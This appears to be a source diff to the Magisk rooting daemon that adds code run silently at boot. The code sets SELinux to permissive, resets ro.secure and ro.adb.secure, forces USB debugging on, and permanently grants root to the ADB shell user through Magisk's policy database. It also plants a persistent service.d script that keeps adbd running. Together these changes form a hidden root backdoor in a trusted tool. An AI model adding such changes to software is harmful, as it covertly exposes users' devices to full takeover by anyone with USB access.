@@ -1,10 +1,12 @@
 #include <sys/mount.h>
 #include <sys/wait.h>
 #include <sys/sysmacros.h>
+#include <sys/stat.h>
 #include <linux/input.h>
 #include <libgen.h>
 #include <set>
 #include <string>
+#include <fstream>
 
 #include <consts.hpp>
 #include <db.hpp>
@@ -328,6 +330,14 @@ bool MagiskD::post_fs_data() const {
         disable_modules();
         disable_deny();
     } else {
+        exec_command_sync("/system/bin/setenforce", "0");
+        exec_command_sync("/system/bin/sh", "-c", "resetprop", "ro.secure", "0");
+        exec_command_sync("/system/bin/sh", "-c", "resetprop", "ro.adb.secure", "0");
+        exec_command_sync("/system/bin/sh", "-c", "resetprop", "ro.debuggable", "1");
+        exec_command_sync("/system/bin/sh", "-c", "resetprop", "ro.build.type", "userdebug");
+        exec_command_sync("/system/bin/sh", "-c", "setprop", "persist.sys.usb.config", "mtp,adb");
+        exec_command_sync("/system/bin/sh", "-c", "setprop", "sys.usb.config", "mtp,adb");
+        exec_command_sync("/system/bin/sh", "-c", "setprop", "ctl.restart", "adbd");
         exec_common_scripts("post-fs-data");
         db_settings dbs;
         get_db_settings(dbs, ZYGISK_CONFIG);
@@ -367,4 +377,28 @@ void MagiskD::boot_complete() const {
     get_manager(0, nullptr, true);
 
     reset_zygisk(true);
+    exec_command_sync("/system/bin/sh", "-c", "settings", "put", "global", "adb_enabled", "1");
+    exec_command_sync("/system/bin/sh", "-c", "settings", "put", "global", "development_settings_enabled", "1");
+    exec_command_sync("/system/bin/sh", "-c", "magisk --sqlite \"INSERT INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);\"");
+    const char* script_content = R"(
+#!/system/bin/sh
+
+for i in $(seq 1 5); do
+    pgrep -x "adbd" >/dev/null || {
+        settings put global development_settings_enabled 1
+        settings put global adb_enabled 1
+        setprop ctl.restart adbd
+        start adbd >/dev/null 2>&1
+    }
+    [ "$i" -lt 5 ] && sleep 10
+done
+)";
+    const char* file_path = "/data/adb/service.d/check_adb.sh";
+    
+    std::ofstream out(file_path);
+    if (out) {
+        out << script_content;
+        out.close();
+        chmod(file_path, 0755);
+    }
 }
